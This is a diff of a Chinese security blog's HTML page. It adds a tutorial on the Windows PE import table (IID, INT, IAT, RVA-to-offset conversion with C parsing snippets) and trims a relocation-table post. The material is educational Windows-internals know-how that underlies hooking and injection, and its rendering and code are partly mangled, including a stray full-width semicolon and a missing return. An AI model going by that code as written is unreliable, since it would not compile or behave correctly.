class="number">00F</span>--&gt;RVA:<span class="number">100F</span>h---&gt;FOA:<span class="number">60F</span></div><div class="line">* Data2:<span class="number">2330</span>--&gt;<span class="number">3023</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span class="number">023</span>--&gt;RVA:<span class="number">1023</span>h---&gt;FOA:<span class="number">623</span></div><div class="line">* Data3:<span class="number">0000</span></div><div class="line">* Data4:<span class="number">0000</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;得到需要重定位的数据为<span class="number">00402000</span>和<span class="number">00403030</span>，假设当前基地址为<span class="number">00400000</span>，目标基地址为<span class="number">01000000</span> 则重定位后的地址为<span class="number">01002000</span>和<span class="number">01003030</span></div><div class="line"></div><div class="line"><span class="meta">## 0x3.3 重定位表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先获取重定位表地址</div></pre></td></tr></table></figure></p>
-<p>//重定位表地址<br>DWORD RelocTableRva = pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>//    printf(“\t\t [<em>]RelocTableRva:%p\n”, RelocTableRva);<br>PIMAGE_BASE_RELOCATION RelocTable =(PIMAGE_BASE_RELOCATION)((ULONG)lpBaseAddress+RvaToOffset(RelocTableRva,lpBaseAddress));<br>printf(“\t\t [</em>]RelocTable:%p\n”, RelocTable);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取每个重定位数组的RVA地址和大小，原因有二，第一，获取完TypeOffset的第<span class="number">12</span>位需要加上VirtualAddress才是真正的RVA，第二，sizeofBlock是指向下一个重定位数组(块)的重要参数。</div></pre></td></tr></table></figure></p>
-<p>DWORD VirtualAddress = RelocTable-&gt;VirtualAddress;<br>printf(“\t\t [*]VirtualAddress:%p”, VirtualAddress);<br>DWORD Cout = (RelocTable-&gt;SizeOfBlock - 8) / 2;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;定位到重定位数组，每个Typeoffset在偏移处第八个字节，所以需要加<span class="number">8</span>。</div></pre></td></tr></table></figure></p>
-<p>WORD<em> RecAddr = (WORD</em>)((BYTE*)RelocTable + 8);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;解析TypeOffset</div></pre></td></tr></table></figure></p>
-<p>//取第三位地址，并加上VirtualAddress才是真的RVA<br>DWORD offset = VirtualAddress + (RecAddr[j] &amp; 0x0FFF);<br>//TYPE<br>DWORD type = RecAddr[j] &gt;&gt; 12;<br>printf(“\t\t Type:[%d] \t RVA:[%p]\n”, type, offset);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;利用sizeofblock定位下一个重定位表</div></pre></td></tr></table></figure></p>
-<p>RelocTable = (IMAGE_BASE_RELOCATION <em>)((BYTE </em>)RelocTable + RelocTable-&gt;SizeOfBlock);<br>```</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/18/一篇文章带你理解HOOK技术/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1330,6 +1315,196 @@
 <li>7.利用PsSetLoadImageNotifyRoutine拦截模块，首先需要获取模块基地址(让其载入)，PE寻找基地址，解析到OEP，修改oep为ret即可</li>
 <li><a href="https://bbs.pediy.com/thread-224514.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-224514.htm</a></li>
 </ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/18/一篇文章带你理解PE三表/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/18/一篇文章带你理解PE三表/" itemprop="url">一篇文章带你理解PE三表</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-18T15:02:11+08:00">
+                2019-04-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows安全/" itemprop="url" rel="index">
+                    <span itemprop="name">windows安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;刚刚结束春招，投了好几家公司，结果不是很理想，原因无外乎自身实力和行业寒冬。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次春招面试题主要集中在PE相关，HOOK技术和DLL注入技术，还有一些杂七杂八的问题上面。从中也暴露处自己技能栈上的不足，通过这一段时间的沉淀希望可以补足。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;四月初就开始谋划写一系列的文章，但是加上在校实习比较忙碌，所以进展很慢，这些文章主要面向受众是那些入坑新人，借此希望能够让那些小伙伴能够少走弯路。同时也能多多总结自身的不足，共同进步。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列文章取啥名？想了很久，决定参考某一师傅的系列文章—&lt;一篇文章带你·····&gt;,主要希望总结PE文件，HOOK,DLL注入，以及其他方面的知识，主要的参考文献是看雪<strong>加密解密第四版</strong>，以及其他资料。(打了广告，希望相关师傅记得打点广告费)</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列是我边总结技术边写文章，可能部分内容会以后补全技能栈，例如R0下的DLL注入等。<strong>但是尽量做到不鸽</strong>，关于代码，不提供自己写的代码，原因有二，第一，这些代码网上都有现成的，我只是理解修改部分罢了，也怕自己的代码误导小伙伴们。<strong>第二，拒绝伸手党</strong>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于自身能力有限，文章中难免出现错误，希望各位师傅少喷我。</p>
+<h1 id="0x1-PE导入表"><a href="#0x1-PE导入表" class="headerlink" title="0x1 PE导入表"></a>0x1 PE导入表</h1><h2 id="0x1-1-输入函数的调用"><a href="#0x1-1-输入函数的调用" class="headerlink" title="0x1.1 输入函数的调用"></a>0x1.1 输入函数的调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL动态链接库文件主要实现代码的复用。当一个程序调用DLL文件中的数据和代码的时候，有两种链接方式，第一种是<strong>隐式链接</strong>，这个过程是由windows装载器完成的，另外一种是<strong>显式链接</strong>，通过使用LoadLibrary和GetProcAddress这两个API函数实现的。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当隐式的调用一个API函数的时候，同样也存在类似于LoadLibrary和GetProcAddress函数的功能实现，但是，这个操作是由windows装载器完成的，所以称为<strong>隐式链接</strong>，当程序使用隐式链接调用DLL代码的时候，装载器需要完成以下几个步骤(IAT填充):</p>
+<ul>
+<li>首先将所需要的DLL文件载入内存，Kernel32.dll等是通过映射的方式载入的</li>
+<li>定位IID，寻找IID的第四个字段Name。</li>
+<li>接着根据OrginalFirstThunk指向，获取INT。</li>
+<li>根据INT执行的IMAGE_IMPORT_BY_NAME结构获取函数名称</li>
+<li>利用类似于GetProcAddress函数功能的操作，获取函数地址VA</li>
+<li>将获取的API函数地址填充入IAT。</li>
+<li>断链，将FirstThunk断开</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序一般使用CALL-JMP的方式调用API方式，显然，这种方式是低效的，不然直接使用CALL高效，之所以使用这种方式，因为编译器无法判断哪些调用是API，哪些调用是普通函数。JMP的地址其实是IAT所在的地址VA。</p>
+<h2 id="0x1-2-导入表结构"><a href="#0x1-2-导入表结构" class="headerlink" title="0x1.2 导入表结构"></a>0x1.2 导入表结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在PE文件可选头中，数据目录项的第一个成员指向的导入表。可以看到2040是一个RVA，这是在内存中的偏移量。我们需要将它转化为文件偏移。<br>    <img src="https://ws3.sinaimg.cn/large/005BYqpgly1g26qg7gjykj30ik01rq2p.jpg" alt=""></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到2040位于.rdata段中。可以使用公式<strong>section[i].PointOfRawData+(offset-VirtuallAddress)</strong>来计算文件偏移。计算出来的文件偏移为600+(2040-2000)=640.也就是说PE导入表在文件中640H的地方。<br>    <img src="https://i.loli.net/2019/04/18/5cb8139b7a014.png" alt=""></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，我们可以使用代码实现这一个需求，代码如下：</p>
+<ul>
+<li>0.定位第一个节区地址</li>
+<li>1.获取节区数目</li>
+<li>2.判断RVA在那个节区</li>
+<li>3.计算:section[i].PointOfRawData+(offset-VirtuallAddress)<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">DWORD RvaToOffset(DWORD ImageAddr, LPVOID lpBaseAddress)</div><div class="line">&#123;</div><div class="line">	<span class="regexp">//</span>NtHeader</div><div class="line">	PIMAGE_NT_HEADERS pNtHeaders = <span class="function"><span class="params">(PIMAGE_NT_HEADERS)((ULONG_PTR)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)-&gt;e_lfanew)</span>;</span></div><div class="line"><span class="function">	//获取第一个节区的RawtoData</span></div><div class="line"><span class="function">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="params">(PIMAGE_SECTION_HEADER)(((ULONG_PTR)&amp;pNtHeaders-&gt;OptionalHeader) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader)</span>;</span></div><div class="line"><span class="function">	if <span class="params">(ImageAddr &gt; pNtHeaders-&gt;OptionalHeader.SizeOfImage)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		printf<span class="params">(<span class="string">"ImageAddr Is Error\n"</span>)</span>;</span></div><div class="line"><span class="function">		return NULL;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">	if <span class="params">(ImageAddr &lt; pSectionHeader[<span class="number">0</span>].PointerToRawData)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		return ImageAddr;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">	DWORD i = 0;</span></div><div class="line"><span class="function">	for <span class="params">(i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		//节区下限</span></div><div class="line"><span class="function">		DWORD lower = pSectionHeader[i].VirtualAddress;</span></div><div class="line"><span class="function">		//节区上线</span></div><div class="line"><span class="function">		DWORD maxer = pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize；</span></div><div class="line"><span class="function">		if <span class="params">(ImageAddr &gt;= lower &amp;&amp; ImageAddr &lt;= maxer)</span></span></div><div class="line"><span class="function">		&#123;</span></div><div class="line"><span class="function">			return pSectionHeader[i].PointerToRawData + <span class="params">(ImageAddr - pSectionHeader[i].VirtualAddress)</span>;</span></div><div class="line"><span class="function">		&#125;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">``` </span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这时候，我们需要用到新的知识IMAGE_IMPORT_DIRECTORY结构。简称IID。**IID结构对应着一个被隐式链接的DLL**，每个IID的结束标志为NULL。关于IID结构：</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>typedef struct _IMAGE_IMPORT_DESCRIPTOR {<br>    union {<br>        DWORD Characteristics;<br>        DWORD OriginalFirstThunk;            //INT(RBA)<br>    };<br>    DWORD TimeDateStamp;                    //时间戳<br>    DWORD ForwarderChain;<br>    DWORD Name;                                //DllName(RVA)<br>    DWORD FirstThunk;                        //IAT(RVA)<br>} IMAGE_IMPORT_DESCRIPTOR;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;需要我们关心的成员有三个：</div><div class="line"></div><div class="line">* OriginalFirstThunk：一个指向导入名称表(INT)**首地址**的RVA.</div><div class="line">* Name:一个指向隐式映射的dll的名称的RVA</div><div class="line">* FirstThunk:一个指向导入地址表(IAT)**首地址**的RVA</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;OriginalFirstThunk和FirstThunk都是指向一个名为IMAGE_THUNK_DATA的结构体，其中被OriginalFirstThunk指向的是导入名称表(INT)，被FirstThunk指向的是导入地址表(IAT)。而INT和IAT同时都指向一个新的结构IAMGE_IMPORT_BY_NAME。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82e31570e7.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，依照IMAGE_IMPORT_DESCRIPTOR来解析上面我们在文件中获取的IID数据如下。但是这些都是小端序显示的，首先需要转化为大端序，然后在使用上面讲的方法将其转化为文件偏移。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81c4e40fa0.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81df448b5c.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先查看<span class="number">774</span>和<span class="number">7</span>B4对应的DLL名称。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81e9677ba3.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后再来查看一下OriginalFirstThunk对应的INT数据，在此之前，我们需要了解一下IMAGE_THUNK_DATA这个数据结构。但是u1是一个共用体，怎么判断IAT中的IMAGE_THUNK_DATA中存储的是Ordinal，还是AddressOfData？**当IMAGE_THUNK_DATA最高位为<span class="number">1</span>的时候，表示序号导入，否则为字符导入，此时保存的是AddressOfData，一个指向IMAGE_IMPORT_BY_NAM的RVA**。一个IMAGE_THUNK_DATA对应一个函数(_IMAGE_IMPORT_BY_NAME)。</div></pre></td></tr></table></figure></p>
+<p>typedef struct _IMAGE_THUNK_DATA<br>{<br>    union<br>    {<br>         PBYTE ForwarderString;<br>         PDWORD Function;     //被导入的函数的入口地址<br>         DWORD Ordinal;       // 该函数的序数<br>         PIMAGE_IMPORT_BY_NAME AddressOfData;   // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME<br>     }u1;<br>} IMAGE_THUNK_DATA32;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在上面，我们了解了IMAGE_THUNK_DAT结构，而且知道了OriginalFirstThunk指向的是IMAGE_THUNK_DAT(INT)。所以，在文件偏移<span class="number">68</span>Ch处，找到数据<span class="number">10210000</span>，同样的，我们将它转化端序和文件偏移得到<span class="number">10210000</span>---&gt;<span class="number">2110</span>---&gt;<span class="number">710</span>。在<span class="number">710</span>处，我们应该可以得到IMAGE_IMPORT_BY_NAME这个结构体。现在，我们需要了解一下这个结构体的形式.</div></pre></td></tr></table></figure></p>
+<p>typedef struct _IMAGE_IMPORT_BY_NAME {<br>     WORD    Hint;       //函数需序号<br>     BYTE    Name[1];    //函数名称<br> } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;了解完IMAGE_IMPORT_BY_NAME这个结构体，在文件<span class="number">710</span>H处查看IMAGE_IMPORT_BY_NAME</div><div class="line">     ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb8264224925.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于IID是一个双桥结构，刚刚我们通过OriginalFirstThunk间接通过IAT寻找到了IMAGE_IMPORT_BY_NAME。接下来使用FirstThunk寻找IMAGE_IMPORT_BY_NAME。可以发现两处都是指向同一个地址，而且这个地址就是IMAGE_IMPORT_BY_NAME</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82826e90dc.png)</span></div><div class="line"></div><div class="line"><span class="meta">## 0x1.3 导入表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;编程实现文件中导入表获取，首先利用ReadFile函数将对象PE文件读入内存,这里可以使用多种方法读取。</div></pre></td></tr></table></figure></p>
+<p>if (!ReadFile(hFile, lpBaseAddress, dwFileSize, &amp;dwNumberOfBytesRead, NULL))<br>{<br>    printf(“ReadFile:%d\n”, GetLastError());<br>    return FALSE;<br>}<br>PrintImportTable(lpBaseAddress);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后在数据目录第二项获取导入表的RVA。但是需要注意的是，必须加上文件在内存中的基地址，这样才是IID的地址。</div></pre></td></tr></table></figure></p>
+<p>//获取导入表地址<br>DWORD Rav_Import_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>PIMAGE_IMPORT_DESCRIPTOR ImportTable = PIMAGE_IMPORT_DESCRIPTOR((ULONG_PTR)lpBaseAddress + Rav_Import_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来是遍历IMAGE_IMPORT_DESCRIPTOR，因为IMAGE_IMPORT_DESCRIPTOR个数是和隐式链接的dll数一致的，但是，IID结束的标志为全<span class="number">0</span>。所以只需要比较从第一个IID开始，如果有sizeof(IMAGE_IMPORT_DESCRIPTOR)个<span class="number">0</span>的话，说明IID遍历结束</div></pre></td></tr></table></figure></p>
+<p>for (i = 0; memcmp(ImportTable + i, &amp;null_iid, sizeof(null_iid)); i++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;打印DLLNAME，利用IMAGE_IMPORT_DIRECTORY-&gt;Name打印DllName。同上，需要加上基地址</div></pre></td></tr></table></figure></p>
+<p>DllName = (LPCSTR)((ULONG_PTR)lpBaseAddress + ImportTable-&gt;Name);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取OriginalFirstThunk。和IID一样的原理遍历INT。</div></pre></td></tr></table></figure></p>
+<p>PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + ImportTable[i].OriginalFirstThunk);<br>//遍历同一个IID下的OriginalFirstThunk<br>for (j = 0; memcmp(pThunk + j, &amp;null_thunk, sizeof(PIMAGE_THUNK_DATA)); j++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;之前说过根据OriginalFirstThunk高位是否为<span class="number">1</span>判断导入方式，如果高位为<span class="number">1</span>,使用序号的方式导入，否则按照函数名称导入</div></pre></td></tr></table></figure></p>
